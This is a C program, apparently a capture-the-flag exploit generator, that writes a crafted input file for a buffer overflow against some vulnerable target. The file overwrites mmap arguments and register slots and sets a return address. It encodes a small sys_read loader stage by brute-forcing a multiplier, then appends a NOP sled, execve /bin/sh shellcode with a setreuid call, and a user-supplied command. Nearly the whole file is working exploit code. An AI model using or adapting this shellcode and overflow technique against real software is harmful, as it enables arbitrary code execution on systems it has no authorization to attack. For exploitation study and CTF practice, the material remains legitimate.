#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define FILENAME "./evilfile.txt"
#define RETURN_ADDRESS "\x00\x40\x41\x41"

/*
 read(fd, buf, count)
 eax = 3 (sys_read)
 ebx = 0 (stdin) - I can easily set this
 ecx = [buffer]
 edx = length (might not matter)

 Step 1: Get the proper return address into ecx, I can store it in edi
 87 cf         xchg ecx, edi

 Step 2: Set eax = sysread (3), I can store it in esi
 96            xchg eax, esi

 Step 3: Set edx = size of the shellcode (0x1000 or less), I can store it in ebp
 87 d5         xchg edx, ebp

 Step 3: Break to the kernel
 cd 80         int 80h

 87 cf 96 87 d5 cd 80 ??
*/



/* We need to calculate (INSTRUCTION1 * x) % MOD = INSTRUCTION2 */
#define INSTRUCTION1      0x8796cf87
#define INSTRUCTION2      0x0080cdd5
#define INSTRUCTION2_BITS 0x00ffffff 

#if 0
#define INSTRUCTION1      0x03cd03cd
#define INSTRUCTION2      0x000003cd
#define INSTRUCTION2_BITS 0x0000ffff
#endif

#define MOD               0xffffffff

/*#define SHELLCODE "\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb\x16\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x4e\x41\x41\x41\x41\x42\x42\x42\x42"*/
#define SHELLCODE "\x6a\x46\x58\x31\xdb\x31\xc9\xcd\x80\xeb\x21\x5f\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe6\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x57\x56\x53\x89\xe1\xcd\x80\xe8\xda\xff\xff\xff if [ -e /bin ]; then ls /; sleep 1; fi; exit;"

int main(int argc, const char *argv[])
{
  int multiplier = 0;
  FILE *f;
  int shellcode_size = sizeof(SHELLCODE);
  int buf_size;

  printf("%p\n", &shellcode_size);

  if(argc != 2)
  {
    printf("Usage: %s [command(s)]\n\n", argv[0]);
    exit(1);
  }

  while ((((INSTRUCTION1 * multiplier + INSTRUCTION1) % MOD) & INSTRUCTION2_BITS) != INSTRUCTION2)
    multiplier++;

  printf("Result should be: %x\n", ((INSTRUCTION1 * multiplier + INSTRUCTION1) % MOD));

  printf("\n");
  printf("multiplier = %u\n", multiplier);
  printf("increment = %u\n", INSTRUCTION1);
  printf("mod = %u\n", MOD);
  printf("\n");

  f = fopen(FILENAME, "w");

  fprintf(f, "%u\n", multiplier); /* How the code changes at each step */
  fprintf(f, "%u\n", INSTRUCTION1); /* Code that gets run */
  buf_size = fprintf(f, "%u", MOD); /* Doesn't matter, but this leads into the overflow */
  fwrite("\0\0\0\0\0\0\0\0\0\0\0\0", 1, 12 - buf_size, f); /* Fill in what's left of the 'mod' buffer */

  fwrite(RETURN_ADDRESS,     1, 4, f); /* Address for mmap() */
  fwrite("\x07\x00\x00\x00", 1, 4, f); /* Protection for mmap() */
  fwrite("\x22\x00\x00\x00", 1, 4, f); /* Flags for mmap() */

  /* Technically these are padding, but we can use them to control registers */
  fwrite("\x00\x00\x00\x00", 1, 4, f); /* ebx - stdin file handle*/
  fwrite("\x03\x00\x00\x00", 1, 4, f); /* esi - sys_read number so we can xchg it */
  fwrite(RETURN_ADDRESS,     1, 4, f); /* edi - return address so we can xchg it */
  fwrite(&shellcode_size,    1, 4, f); /* ebp - size of shellcode so we can xchg it */
  fwrite(RETURN_ADDRESS,     1, 4, f); /* Return address */
  fwrite("\n",               1, 1, f);

  /* Eat up a few bytes, since we're reading over top of our 'loader' */
  fwrite("\x90\x90\x90\x90\x90\x90\x90\x90", 1, 8, f);

  /* Send the shellcode */
  fwrite(SHELLCODE, 1, sizeof(SHELLCODE), f);

  fwrite(argv[1], 1, strlen(argv[1])+1, f);

  return 0;
}
